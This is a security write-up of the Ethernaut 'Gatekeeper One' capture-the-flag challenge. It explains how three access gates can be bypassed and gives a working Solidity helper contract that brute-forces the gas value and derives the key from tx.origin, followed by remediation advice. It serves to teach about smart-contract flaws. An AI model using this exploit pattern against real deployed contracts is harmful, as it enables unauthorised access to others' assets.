# Gatekeeper One — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 14 — Gatekeeper One](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-gatekeeper-one) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/GatekeeperOne.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical (broken access control) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`enter` is gated by three modifiers. None are strong auth:

1. **gateOne** — forces a contract middleman (`msg.sender != tx.origin`).
2. **gateTwo** — requires `gasleft() % 8191 == 0`; solvable by brute-forcing gas stipend.
3. **gateThree** — “key” is fully determined by `tx.origin` bit masks.

A helper that builds `key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)` and retries `enter` with varying gas sets `entrant = tx.origin`.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player is entrant | `gateKeeperInstance.entrant() == player` |

---

## Findings

### [H-01] Contract-caller gate is intentional but trivial

| Field | Detail |
|-------|--------|
| **Severity** | High (in combo) |
| **Bug class** | Weak access control |
| **Location** | `gateOne` |

Deploy any helper; `msg.sender` becomes the helper while `tx.origin` stays the player.

### [H-02] Gas modulo is brute-forceable

| Field | Detail |
|-------|--------|
| **Severity** | High |
| **Bug class** | Predictable / search space constraint |
| **Location** | `gateTwo` |

8191 candidates. Loop `call{gas: 8191*k + i}` until one succeeds.

### [C-01] Key derived from `tx.origin`

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Broken authentication / type-cast puzzles |
| **Location** | `gateThree` |

Constraints:

| Check | Meaning |
|-------|---------|
| `uint32(key) == uint16(key)` | Bytes 2–3 of low dword are zero |
| `uint32(key) != uint64(key)` | High 4 bytes non-zero |
| `uint32(key) == uint16(tx.origin)` | Low 2 bytes match origin |

#### Proof of concept

```bash
cd web3-ctf-challenges/14-ethernaut-gatekeeper-one
forge test --match-test testExploit -vv
```

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
contract HelperContract {
    function attack(address target, bytes8 gateKey) external {
        for (uint256 i = 0; i < 8191; i++) {
            (bool ok,) = target.call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (ok) return;
        }
        revert("gateTwo gas not found");
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);
    bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
    HelperContract helper = new HelperContract();
    helper.attack(address(gateKeeperInstance), key);
    vm.stopBroadcast();
}
```

---

## Remediation

Do not use `gasleft()`, `tx.origin`, or address bit-masking as authorization. Prefer explicit allowlists, signatures, or role-based access with clear intent.

---

## Key lessons

1. **`tx.origin` ≠ authentication** — and bit masks of it are public
2. **Gas-based gates** have a finite search space
3. **`msg.sender != tx.origin`** only means “called via contract,” not “authorized”

---

## References

- [SCH Gatekeeper One](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-gatekeeper-one)
- Local: `Exploit.s.sol`, `test/GatekeeperOneExploit.t.sol`
